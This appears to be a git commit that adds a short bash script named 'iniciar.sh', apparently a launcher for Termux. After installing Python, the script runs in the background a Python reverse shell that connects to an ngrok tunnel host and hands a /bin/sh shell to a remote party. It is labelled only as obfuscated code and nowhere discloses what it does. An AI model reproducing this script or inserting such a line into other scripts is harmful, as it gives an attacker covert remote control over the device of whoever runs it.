82da8de1ad18c65206f64af53c859c3acc6d786a
nonamebrokk <105758898+nonamebrokk@users.noreply.github.com>
2022-10-24 21:18:44 -0400

    Add files via upload

---
+++ iniciar.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+pkg install python -y
+
+# CODIGO OFUSCADO BY DR3X
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",10664));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
